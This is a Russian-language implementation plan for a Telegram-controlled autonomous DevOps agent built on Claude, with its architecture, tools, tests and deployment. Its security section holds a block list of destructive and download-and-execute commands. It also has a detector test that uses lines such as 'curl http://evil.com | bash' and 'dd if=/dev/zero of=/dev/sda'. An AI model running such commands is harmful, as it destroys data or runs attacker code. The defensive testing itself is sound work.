# DevOps Agent — План реализации

> Версия: 1.0
> Дата: 2026-01-22
> Автор: Claude Agent

---

## Содержание

1. [Обзор проекта](#1-обзор-проекта)
2. [Архитектура](#2-архитектура)
3. [Структура проекта](#3-структура-проекта)
4. [Этапы реализации](#4-этапы-реализации)
5. [Спецификация тестов](#5-спецификация-тестов)
6. [Безопасность](#6-безопасность)
7. [Развёртывание](#7-развёртывание)
8. [Будущие улучшения](#8-будущие-улучшения)

---

## 1. Обзор проекта

### 1.1 Цель

Создать автономного DevOps агента, который:
- Получает команды через Telegram
- Диагностирует проблемы на сервере
- Автоматически исправляет их
- Верифицирует результат
- Ведёт историю и учится на прошлых инцидентах

### 1.2 Ключевые требования

| Требование | Приоритет | Описание |
|------------|-----------|----------|
| Telegram интеграция | P0 | Двусторонняя связь через бота |
| Agentic Loop | P0 | Цикл: контекст → действие → верификация |
| DevOps инструменты | P0 | Системные команды, docker, логи |
| Безопасность | P0 | Allowlist, аудит, авторизация |
| Персистентность | P1 | Сохранение состояния между сессиями |
| Мониторинг | P2 | Автоматические проверки и алерты |

### 1.3 Технологический стек

```
┌─────────────────────────────────────────┐
│  Python 3.11+                           │
├─────────────────────────────────────────┤
│  aiogram 3.x      — Telegram Bot API    │
│  anthropic        — Claude API          │
│  pydantic         — Валидация данных    │
│  aiosqlite        — Асинхронная БД      │
│  pytest + pytest-asyncio — Тесты        │
│  structlog        — Структурированные   │
│                     логи                │
└─────────────────────────────────────────┘
```

---

## 2. Архитектура

### 2.1 Общая схема

```
┌────────────────────────────────────────────────────────────────────┐
│                              СЕРВЕР                                │
│                                                                    │
│  ┌──────────────┐     ┌─────────────────────────────────────────┐ │
│  │   Telegram   │     │              DevOps Agent               │ │
│  │   Bot API    │◄───►│                                         │ │
│  └──────────────┘     │  ┌─────────┐  ┌──────────┐  ┌────────┐ │ │
│         │             │  │ Message │  │ Agentic  │  │ Tool   │ │ │
│         │             │  │ Handler │─►│  Loop    │─►│Executor│ │ │
│         │             │  └─────────┘  └──────────┘  └────────┘ │ │
│         │             │       │            │             │      │ │
│         │             │       ▼            ▼             ▼      │ │
│         │             │  ┌─────────────────────────────────────┐│ │
│         │             │  │           State Manager             ││ │
│         │             │  │  • Sessions  • History  • Audit     ││ │
│         │             │  └─────────────────────────────────────┘│ │
│         │             └─────────────────────────────────────────┘ │
│         │                              │                          │
│         ▼                              ▼                          │
│  ┌──────────────┐              ┌──────────────┐                  │
│  │   Response   │              │    System    │                  │
│  │    Queue     │              │   Resources  │                  │
│  └──────────────┘              │  • systemd   │                  │
│                                │  • docker    │                  │
│                                │  • files     │                  │
│                                │  • network   │                  │
│                                └──────────────┘                  │
└────────────────────────────────────────────────────────────────────┘
```

### 2.2 Agentic Loop (по Anthropic Best Practices)

```
┌─────────────────────────────────────────────────────────────┐
│                     AGENTIC LOOP                            │
│                                                             │
│   ┌─────────┐    ┌─────────┐    ┌─────────┐    ┌────────┐ │
│   │ GATHER  │───►│  TAKE   │───►│ VERIFY  │───►│ REPORT │ │
│   │ CONTEXT │    │ ACTION  │    │  WORK   │    │        │ │
│   └─────────┘    └─────────┘    └─────────┘    └────────┘ │
│        │                              │                    │
│        │         ┌────────────────────┘                    │
│        │         │ Не прошло?                              │
│        │         ▼                                         │
│        └────────►○ Повторить с новым контекстом            │
│                                                             │
│   Максимум итераций: 10                                    │
│   Таймаут на итерацию: 60 сек                              │
└─────────────────────────────────────────────────────────────┘
```

### 2.3 Компоненты системы

| Компонент | Файл | Ответственность |
|-----------|------|-----------------|
| TelegramBot | `src/bot.py` | Приём/отправка сообщений |
| MessageHandler | `src/handlers.py` | Роутинг команд |
| AgenticLoop | `src/agent.py` | Основной цикл агента |
| ToolExecutor | `src/tools.py` | Выполнение инструментов |
| StateManager | `src/state.py` | Персистентность |
| SecurityGuard | `src/security.py` | Проверки безопасности |
| Config | `src/config.py` | Конфигурация |

---

## 3. Структура проекта

```
/home/temrjan/claude-agent/
│
├── docs/                          # Документация
│   ├── IMPLEMENTATION_PLAN.md     # Этот документ
│   ├── API.md                     # Описание API инструментов
│   ├── SECURITY.md                # Политики безопасности
│   └── CHANGELOG.md               # История изменений
│
├── src/                           # Исходный код
│   ├── __init__.py
│   ├── main.py                    # Точка входа
│   ├── config.py                  # Конфигурация
│   ├── bot.py                     # Telegram бот
│   ├── handlers.py                # Обработчики сообщений
│   ├── agent.py                   # Agentic loop
│   ├── tools.py                   # DevOps инструменты
│   ├── state.py                   # Управление состоянием
│   ├── security.py                # Безопасность
│   └── utils.py                   # Утилиты
│
├── tests/                         # Тесты
│   ├── __init__.py
│   ├── conftest.py                # Pytest fixtures
│   ├── test_tools.py              # Тесты инструментов
│   ├── test_agent.py              # Тесты агента
│   ├── test_security.py           # Тесты безопасности
│   ├── test_state.py              # Тесты состояния
│   └── test_integration.py        # Интеграционные тесты
│
├── config/                        # Конфигурация
│   ├── .env.example               # Пример переменных окружения
│   ├── allowlist.json             # Разрешённые команды
│   └── tools.json                 # Конфигурация инструментов
│
├── data/                          # Данные (gitignore)
│   ├── agent.db                   # SQLite база
│   ├── progress.json              # Прогресс сессий
│   └── history.json               # История команд
│
├── logs/                          # Логи (gitignore)
│   ├── agent.log                  # Основной лог
│   └── audit.log                  # Аудит безопасности
│
├── screenshots/                   # Скриншоты для анализа
├── projects/                      # Рабочие проекты
├── backups/                       # Бэкапы
├── tmp/                           # Временные файлы
│
├── scripts/                       # Скрипты
│   ├── install.sh                 # Установка
│   ├── setup_systemd.sh           # Настройка systemd
│   └── backup.sh                  # Бэкап данных
│
├── pyproject.toml                 # Конфигурация проекта
├── requirements.txt               # Зависимости
├── Makefile                       # Команды make
└── README.md                      # Описание проекта
```

---

## 4. Этапы реализации

### Этап 0: Подготовка окружения
**Длительность: ~15 минут**

#### Задачи:
- [ ] 0.1 Установить Python 3.11+
- [ ] 0.2 Создать виртуальное окружение
- [ ] 0.3 Установить базовые зависимости
- [ ] 0.4 Настроить структуру проекта

#### Команды:
```bash
# Установка Python
sudo pacman -S python python-pip python-virtualenv

# Создание venv
cd /home/temrjan/claude-agent
python -m venv venv
source venv/bin/activate

# Установка зависимостей
pip install aiogram anthropic pydantic aiosqlite structlog pytest pytest-asyncio
```

#### Критерий завершения:
```bash
python --version  # >= 3.11
pip list | grep aiogram  # установлен
```

---

### Этап 1: Конфигурация и базовая структура
**Длительность: ~30 минут**

#### Задачи:
- [ ] 1.1 Создать `pyproject.toml`
- [ ] 1.2 Создать `src/config.py` с pydantic Settings
- [ ] 1.3 Создать `.env.example`
- [ ] 1.4 Создать `config/allowlist.json`
- [ ] 1.5 Настроить логирование (`structlog`)

#### Файлы:

**src/config.py**
```python
from pydantic_settings import BaseSettings
from pathlib import Path

class Settings(BaseSettings):
    # Telegram
    telegram_bot_token: str
    allowed_user_ids: list[int]

    # Anthropic
    anthropic_api_key: str
    model: str = "claude-sonnet-4-20250514"
    max_tokens: int = 4096

    # Paths
    base_dir: Path = Path("/home/temrjan/claude-agent")
    data_dir: Path = base_dir / "data"
    logs_dir: Path = base_dir / "logs"

    # Agent
    max_iterations: int = 10
    tool_timeout: int = 30

    class Config:
        env_file = ".env"
```

#### Тесты этапа:
```python
# tests/test_config.py
def test_settings_loads_from_env():
    settings = Settings()
    assert settings.telegram_bot_token
    assert len(settings.allowed_user_ids) > 0

def test_paths_exist():
    settings = Settings()
    assert settings.base_dir.exists()
```

#### Критерий завершения:
- [ ] `pytest tests/test_config.py` — все тесты проходят
- [ ] `.env` файл создан с реальными значениями

---

### Этап 2: Модуль безопасности
**Длительность: ~45 минут**

#### Задачи:
- [ ] 2.1 Создать `src/security.py`
- [ ] 2.2 Реализовать проверку пользователей
- [ ] 2.3 Реализовать allowlist команд
- [ ] 2.4 Реализовать аудит логирование
- [ ] 2.5 Добавить защиту от инъекций

#### Компоненты:

```python
# src/security.py

class SecurityGuard:
    """Страж безопасности"""

    def is_user_allowed(self, user_id: int) -> bool:
        """Проверка авторизации пользователя"""

    def is_command_allowed(self, command: str) -> bool:
        """Проверка команды по allowlist"""

    def sanitize_input(self, text: str) -> str:
        """Очистка ввода от опасных символов"""

    def audit_log(self, user_id: int, action: str, details: str):
        """Запись в аудит лог"""

    def check_dangerous_patterns(self, command: str) -> list[str]:
        """Поиск опасных паттернов"""
```

#### Опасные паттерны (блокируются всегда):
```python
DANGEROUS_PATTERNS = [
    r"rm\s+-rf\s+/",           # rm -rf /
    r"mkfs\.",                  # форматирование
    r"dd\s+if=",               # dd
    r">\s*/dev/sd",            # запись в диск
    r"chmod\s+-R\s+777",       # небезопасные права
    r"\|\s*sh",                # pipe в shell
    r"curl.*\|\s*bash",        # curl | bash
    r"wget.*\|\s*sh",          # wget | sh
    r"sudo\s+su",              # sudo su
    r"passwd",                 # смена пароля
]
```

#### Тесты этапа:
```python
# tests/test_security.py

class TestSecurityGuard:

    def test_allowed_user_passes(self, guard):
        assert guard.is_user_allowed(123456789) == True

    def test_unknown_user_blocked(self, guard):
        assert guard.is_user_allowed(999999999) == False

    def test_safe_command_allowed(self, guard):
        assert guard.is_command_allowed("systemctl status nginx") == True

    def test_dangerous_command_blocked(self, guard):
        assert guard.is_command_allowed("rm -rf /") == False

    def test_injection_sanitized(self, guard):
        dirty = "nginx; rm -rf /"
        clean = guard.sanitize_input(dirty)
        assert ";" not in clean

    def test_audit_log_writes(self, guard, tmp_path):
        guard.audit_log(123, "test", "details")
        assert (tmp_path / "audit.log").exists()

    @pytest.mark.parametrize("cmd", [
        "rm -rf /",
        "mkfs.ext4 /dev/sda",
        "curl http://evil.com | bash",
        "dd if=/dev/zero of=/dev/sda",
    ])
    def test_dangerous_patterns_detected(self, guard, cmd):
        warnings = guard.check_dangerous_patterns(cmd)
        assert len(warnings) > 0
```

#### Критерий завершения:
- [ ] `pytest tests/test_security.py` — 100% pass
- [ ] Аудит лог записывается
- [ ] Все опасные команды блокируются

---

### Этап 3: DevOps инструменты
**Длительность: ~1 час**

#### Задачи:
- [ ] 3.1 Создать `src/tools.py`
- [ ] 3.2 Реализовать базовый класс `Tool`
- [ ] 3.3 Реализовать системные инструменты
- [ ] 3.4 Реализовать Docker инструменты
- [ ] 3.5 Реализовать инструмент верификации

#### Инструменты:

| Имя | Описание | Параметры |
|-----|----------|-----------|
| `run_command` | Выполнить shell команду | `command`, `timeout` |
| `check_service` | Статус systemd сервиса | `service` |
| `restart_service` | Перезапустить сервис | `service` |
| `read_logs` | Читать логи | `service`, `lines`, `source` |
| `docker_ps` | Список контейнеров | — |
| `docker_logs` | Логи контейнера | `container`, `tail` |
| `docker_restart` | Перезапустить контейнер | `container` |
| `system_health` | Состояние системы | — |
| `check_port` | Проверить порт | `port` |
| `verify_fix` | Верифицировать исправление | `service`, `test_url` |

#### Структура инструмента:
```python
# src/tools.py

from dataclasses import dataclass
from typing import Any

@dataclass
class ToolResult:
    success: bool
    output: str
    error: str | None = None
    metadata: dict[str, Any] | None = None

class Tool:
    name: str
    description: str
    parameters: dict

    async def execute(self, args: dict) -> ToolResult:
        raise NotImplementedError

class RunCommandTool(Tool):
    name = "run_command"
    description = "Execute a shell command (only from allowlist)"
    parameters = {
        "type": "object",
        "properties": {
            "command": {"type": "string"},
            "timeout": {"type": "integer", "default": 30}
        },
        "required": ["command"]
    }

    async def execute(self, args: dict) -> ToolResult:
        # Реализация...
```

#### Тесты этапа:
```python
# tests/test_tools.py

class TestRunCommandTool:

    @pytest.mark.asyncio
    async def test_executes_allowed_command(self, tool):
        result = await tool.execute({"command": "echo hello"})
        assert result.success
        assert "hello" in result.output

    @pytest.mark.asyncio
    async def test_timeout_works(self, tool):
        result = await tool.execute({
            "command": "sleep 10",
            "timeout": 1
        })
        assert not result.success
        assert "timeout" in result.error.lower()

class TestCheckServiceTool:

    @pytest.mark.asyncio
    async def test_detects_running_service(self, tool):
        result = await tool.execute({"service": "systemd-journald"})
        assert result.success
        assert "active" in result.output.lower()

class TestVerifyFixTool:

    @pytest.mark.asyncio
    async def test_verifies_service_status(self, tool):
        result = await tool.execute({
            "service": "systemd-journald"
        })
        assert result.success
        assert result.metadata["service_active"] == True

    @pytest.mark.asyncio
    async def test_verifies_http_endpoint(self, tool, mock_server):
        result = await tool.execute({
            "service": "mock",
            "test_url": mock_server.url
        })
        assert result.metadata["http_status"] == 200
```

#### Критерий завершения:
- [ ] `pytest tests/test_tools.py` — 100% pass
- [ ] Все 10 инструментов реализованы
- [ ] Таймауты работают корректно

---

### Этап 4: Управление состоянием
**Длительность: ~45 минут**

#### Задачи:
- [ ] 4.1 Создать `src/state.py`
- [ ] 4.2 Реализовать SQLite хранилище
- [ ] 4.3 Реализовать сессии
- [ ] 4.4 Реализовать историю инцидентов
- [ ] 4.5 Реализовать компактификацию контекста

#### Схема базы данных:
```sql
-- sessions: активные сессии
CREATE TABLE sessions (
    id TEXT PRIMARY KEY,
    user_id INTEGER NOT NULL,
    started_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    last_activity TIMESTAMP,
    context TEXT,  -- JSON
    status TEXT DEFAULT 'active'
);

-- incidents: история инцидентов
CREATE TABLE incidents (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER NOT NULL,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    query TEXT NOT NULL,
    resolution TEXT,
    tools_used TEXT,  -- JSON array
    success BOOLEAN,
    duration_seconds REAL
);

-- audit_log: аудит
CREATE TABLE audit_log (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    user_id INTEGER,
    action TEXT NOT NULL,
    details TEXT,
    ip_address TEXT
);
```

#### Тесты этапа:
```python
# tests/test_state.py

class TestStateManager:

    @pytest.mark.asyncio
    async def test_creates_session(self, state):
        session = await state.create_session(user_id=123)
        assert session.id
        assert session.user_id == 123

    @pytest.mark.asyncio
    async def test_saves_incident(self, state):
        await state.save_incident(
            user_id=123,
            query="nginx down",
            resolution="restarted",
            success=True
        )
        incidents = await state.get_recent_incidents(user_id=123)
        assert len(incidents) == 1

    @pytest.mark.asyncio
    async def test_context_compaction(self, state):
        # Добавляем много сообщений
        for i in range(100):
            await state.add_message(session_id="test", content=f"msg {i}")

        # Компактифицируем
        await state.compact_context(session_id="test", max_messages=20)

        messages = await state.get_messages(session_id="test")
        assert len(messages) <= 20
```

#### Критерий завершения:
- [ ] `pytest tests/test_state.py` — 100% pass
- [ ] База данных создаётся автоматически
- [ ] Миграции работают

---

### Этап 5: Agentic Loop
**Длительность: ~1.5 часа**

#### Задачи:
- [ ] 5.1 Создать `src/agent.py`
- [ ] 5.2 Реализовать основной цикл
- [ ] 5.3 Интегрировать Claude API
- [ ] 5.4 Реализовать обработку tool_use
- [ ] 5.5 Реализовать верификацию
- [ ] 5.6 Добавить retry с exponential backoff

#### Алгоритм:
```python
# src/agent.py

class DevOpsAgent:

    async def run(self, user_message: str, user_id: int) -> str:
        """
        Основной agentic loop

        1. Загрузить контекст (история, предыдущие инциденты)
        2. Отправить в Claude с system prompt
        3. Если tool_use:
           a. Выполнить инструмент
           b. Добавить результат в контекст
           c. Повторить с шага 2
        4. Если end_turn:
           a. Сохранить инцидент
           b. Вернуть ответ
        5. Верифицировать результат (если были изменения)
        """
```

#### System Prompt:
```python
SYSTEM_PROMPT = """Ты DevOps агент для сервера. Твоя задача — диагностировать и исправлять проблемы.

## Алгоритм работы (СТРОГО следуй):

1. **GATHER CONTEXT** — Сначала собери информацию:
   - Проверь статус сервиса (check_service)
   - Прочитай логи (read_logs)
   - Проверь системные ресурсы (system_health)

2. **ANALYZE** — Проанализируй собранные данные:
   - Определи корневую причину
   - Составь план действий

3. **TAKE ACTION** — Выполни исправление:
   - Используй минимально необходимые действия
   - Одно действие за раз

4. **VERIFY** — ОБЯЗАТЕЛЬНО проверь результат:
   - Используй verify_fix после каждого исправления
   - Убедись, что проблема решена

5. **REPORT** — Сообщи результат:
   - Что было не так
   - Что сделал
   - Текущий статус

## Контекст предыдущих инцидентов:
{incidents_context}

## Правила безопасности:
- НЕ выполняй деструктивные команды
- НЕ изменяй системные файлы без явной необходимости
- ВСЕГДА проверяй результат
- При сомнениях — спроси пользователя
"""
```

#### Тесты этапа:
```python
# tests/test_agent.py

class TestDevOpsAgent:

    @pytest.mark.asyncio
    async def test_simple_query_returns_response(self, agent):
        response = await agent.run(
            user_message="какой статус nginx?",
            user_id=123
        )
        assert response
        assert isinstance(response, str)

    @pytest.mark.asyncio
    async def test_uses_tools_when_needed(self, agent, mock_claude):
        mock_claude.return_tool_use("check_service", {"service": "nginx"})

        response = await agent.run(
            user_message="проверь nginx",
            user_id=123
        )

        assert mock_claude.tools_called == ["check_service"]

    @pytest.mark.asyncio
    async def test_verifies_after_fix(self, agent, mock_claude):
        # Настраиваем mock: сначала restart, потом verify
        mock_claude.return_tool_sequence([
            ("restart_service", {"service": "nginx"}),
            ("verify_fix", {"service": "nginx"})
        ])

        response = await agent.run(
            user_message="перезапусти nginx",
            user_id=123
        )

        assert "verify_fix" in mock_claude.tools_called

    @pytest.mark.asyncio
    async def test_respects_max_iterations(self, agent, mock_claude):
        # Claude бесконечно вызывает инструменты
        mock_claude.always_return_tool_use()

        with pytest.raises(MaxIterationsExceeded):
            await agent.run("бесконечный цикл", user_id=123)

    @pytest.mark.asyncio
    async def test_retries_on_api_error(self, agent, mock_claude):
        mock_claude.fail_first_n_calls(2)

        response = await agent.run("тест retry", user_id=123)

        assert mock_claude.call_count == 3  # 2 failed + 1 success

    @pytest.mark.asyncio
    async def test_includes_incident_history(self, agent, state):
        # Добавляем предыдущий инцидент
        await state.save_incident(
            user_id=123,
            query="nginx упал",
            resolution="перезапустил",
            success=True
        )

        response = await agent.run(
            user_message="nginx опять упал",
            user_id=123
        )

        # Агент должен учитывать историю
        # (проверяем через system prompt в mock)
        assert "nginx упал" in mock_claude.last_system_prompt
```

#### Критерий завершения:
- [ ] `pytest tests/test_agent.py` — 100% pass
- [ ] Агент выполняет полный цикл gather → act → verify
- [ ] Retry работает при ошибках API
- [ ] История инцидентов учитывается

---

### Этап 6: Telegram Bot
**Длительность: ~1 час**

#### Задачи:
- [ ] 6.1 Создать `src/bot.py`
- [ ] 6.2 Реализовать обработчики команд
- [ ] 6.3 Интегрировать с агентом
- [ ] 6.4 Добавить rate limiting
- [ ] 6.5 Реализовать graceful shutdown

#### Команды бота:

| Команда | Описание |
|---------|----------|
| `/start` | Приветствие и инструкции |
| `/help` | Список команд |
| `/health` | Состояние системы |
| `/logs <service>` | Последние логи сервиса |
| `/status` | Статус агента |
| `/history` | Последние инциденты |

#### Тесты этапа:
```python
# tests/test_bot.py

class TestTelegramBot:

    @pytest.mark.asyncio
    async def test_start_command(self, bot, fake_update):
        fake_update.message.text = "/start"

        await bot.handle_update(fake_update)

        assert fake_update.message.reply_text.called

    @pytest.mark.asyncio
    async def test_unauthorized_user_ignored(self, bot, fake_update):
        fake_update.message.from_user.id = 999999  # Не в allowlist

        await bot.handle_update(fake_update)

        assert not fake_update.message.reply_text.called

    @pytest.mark.asyncio
    async def test_message_triggers_agent(self, bot, agent, fake_update):
        fake_update.message.text = "проверь nginx"

        await bot.handle_update(fake_update)

        assert agent.run.called

    @pytest.mark.asyncio
    async def test_rate_limiting(self, bot, fake_update):
        # 10 сообщений быстро
        for _ in range(15):
            await bot.handle_update(fake_update)

        # Должен быть rate limit
        assert bot.rate_limiter.is_limited(fake_update.message.from_user.id)
```

#### Критерий завершения:
- [ ] `pytest tests/test_bot.py` — 100% pass
- [ ] Бот отвечает на команды
- [ ] Unauthorized пользователи игнорируются
- [ ] Rate limiting работает

---

### Этап 7: Интеграционные тесты
**Длительность: ~1 час**

#### Задачи:
- [ ] 7.1 Создать `tests/test_integration.py`
- [ ] 7.2 Тесты end-to-end сценариев
- [ ] 7.3 Тесты с реальными сервисами (docker)
- [ ] 7.4 Нагрузочные тесты

#### E2E сценарии:
```python
# tests/test_integration.py

class TestE2EScenarios:

    @pytest.mark.integration
    @pytest.mark.asyncio
    async def test_scenario_nginx_restart(self, full_system):
        """
        Сценарий: Пользователь просит перезапустить nginx

        1. Получаем сообщение
        2. Агент проверяет статус
        3. Агент перезапускает
        4. Агент верифицирует
        5. Пользователь получает ответ
        """
        response = await full_system.send_message("перезапусти nginx")

        assert "nginx" in response.lower()
        assert any(word in response.lower() for word in ["перезапущен", "работает", "active"])

    @pytest.mark.integration
    @pytest.mark.asyncio
    async def test_scenario_disk_space(self, full_system):
        """
        Сценарий: Проверка места на диске
        """
        response = await full_system.send_message("сколько места на диске?")

        assert "%" in response  # Должен быть процент

    @pytest.mark.integration
    @pytest.mark.asyncio
    async def test_scenario_blocked_command(self, full_system):
        """
        Сценарий: Попытка выполнить опасную команду
        """
        response = await full_system.send_message("выполни rm -rf /")

        assert any(word in response.lower() for word in ["заблокирован", "запрещ", "нельзя"])
```

#### Критерий завершения:
- [ ] `pytest tests/test_integration.py` — 100% pass
- [ ] Все E2E сценарии работают
- [ ] Система устойчива под нагрузкой

---

### Этап 8: Развёртывание
**Длительность: ~30 минут**

#### Задачи:
- [ ] 8.1 Создать systemd unit файл
- [ ] 8.2 Настроить автозапуск
- [ ] 8.3 Настроить ротацию логов
- [ ] 8.4 Создать скрипт бэкапа

#### Файлы:

**scripts/setup_systemd.sh**
```bash
#!/bin/bash
sudo tee /etc/systemd/system/devops-agent.service << 'EOF'
[Unit]
Description=DevOps Telegram Agent
After=network.target

[Service]
Type=simple
User=temrjan
WorkingDirectory=/home/temrjan/claude-agent
Environment=PATH=/home/temrjan/claude-agent/venv/bin
ExecStart=/home/temrjan/claude-agent/venv/bin/python -m src.main
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload
sudo systemctl enable devops-agent
sudo systemctl start devops-agent
```

#### Критерий завершения:
- [ ] `systemctl status devops-agent` — active (running)
- [ ] Бот отвечает после перезагрузки сервера
- [ ] Логи ротируются

---

## 5. Спецификация тестов

### 5.1 Покрытие кода

| Модуль | Минимум покрытия |
|--------|------------------|
| security.py | 100% |
| tools.py | 95% |
| agent.py | 90% |
| state.py | 90% |
| bot.py | 85% |
| config.py | 80% |

### 5.2 Типы тестов

```
tests/
├── unit/                    # Модульные тесты (быстрые)
│   ├── test_security.py
│   ├── test_tools.py
│   └── test_config.py
│
├── integration/             # Интеграционные (медленнее)
│   ├── test_agent_tools.py
│   └── test_bot_agent.py
│
└── e2e/                     # End-to-end (самые медленные)
    └── test_scenarios.py
```

### 5.3 Команды запуска

```bash
# Все тесты
make test

# Только unit
pytest tests/unit -v

# Только integration
pytest tests/integration -v --slow

# С покрытием
pytest --cov=src --cov-report=html

# Конкретный файл
pytest tests/test_security.py -v
```

---

## 6. Безопасность

### 6.1 Модель угроз

| Угроза | Митигация |
|--------|-----------|
| Неавторизованный доступ | Whitelist user IDs |
| Command injection | Allowlist + sanitization |
| DoS через бота | Rate limiting |
| Утечка секретов | .env в gitignore, audit log |
| Опасные команды | Блокировка паттернов |

### 6.2 Чеклист безопасности

- [ ] `.env` не в git
- [ ] Audit log включен
- [ ] Dangerous patterns блокируются
- [ ] Rate limiting настроен
- [ ] Только whitelist команды разрешены
- [ ] Таймауты на все операции

---

## 7. Развёртывание

### 7.1 Чеклист деплоя

```
[ ] Python 3.11+ установлен
[ ] Виртуальное окружение создано
[ ] Зависимости установлены
[ ] .env файл создан
[ ] Telegram бот создан (@BotFather)
[ ] Anthropic API ключ получен
[ ] Тесты проходят
[ ] Systemd сервис настроен
[ ] Логи ротируются
[ ] Бэкап настроен
```

### 7.2 Мониторинг

```bash
# Статус сервиса
systemctl status devops-agent

# Логи в реальном времени
journalctl -u devops-agent -f

# Проверка здоровья
curl -s localhost:8080/health  # если добавим healthcheck endpoint
```

---

## 8. Будущие улучшения

### Версия 1.1
- [ ] Web dashboard для мониторинга
- [ ] Prometheus метрики
- [ ] Scheduled health checks

### Версия 1.2
- [ ] Multi-user support
- [ ] Kubernetes инструменты
- [ ] AWS/GCP интеграция

### Версия 2.0
- [ ] Voice messages (STT)
- [ ] Автоматическое обучение на инцидентах
- [ ] Интеграция с PagerDuty/OpsGenie

---

## Приложения

### A. Полный список разрешённых команд

```json
{
  "system": [
    "systemctl status *",
    "systemctl restart *",
    "systemctl start *",
    "systemctl stop *",
    "journalctl -u * -n *",
    "df -h",
    "free -m",
    "uptime",
    "top -bn1",
    "ps aux",
    "netstat -tlnp",
    "ss -tlnp"
  ],
  "docker": [
    "docker ps",
    "docker ps -a",
    "docker logs *",
    "docker restart *",
    "docker compose up -d",
    "docker compose down",
    "docker compose logs *"
  ],
  "network": [
    "curl -s *",
    "ping -c 4 *",
    "dig *",
    "nslookup *"
  ],
  "files": [
    "cat /var/log/*",
    "tail -n * /var/log/*",
    "ls -la *",
    "du -sh *"
  ]
}
```

### B. Примеры диалогов

```
User: nginx не отвечает

Agent: Проверяю статус nginx...
       ❌ nginx: inactive (dead)

       Читаю логи...
       [error] bind() to 0.0.0.0:80 failed (98: Address already in use)

       Проверяю что занимает порт 80...
       apache2 (pid 1234)

       Останавливаю apache2...
       ✅ apache2 остановлен

       Запускаю nginx...
       ✅ nginx запущен

       Верифицирую...
       ✅ nginx: active (running)
       ✅ curl localhost:80 → 200 OK

       Проблема решена. Nginx работает, apache2 был остановлен.
```

---

*Документ создан: 2026-01-22*
*Последнее обновление: 2026-01-22*
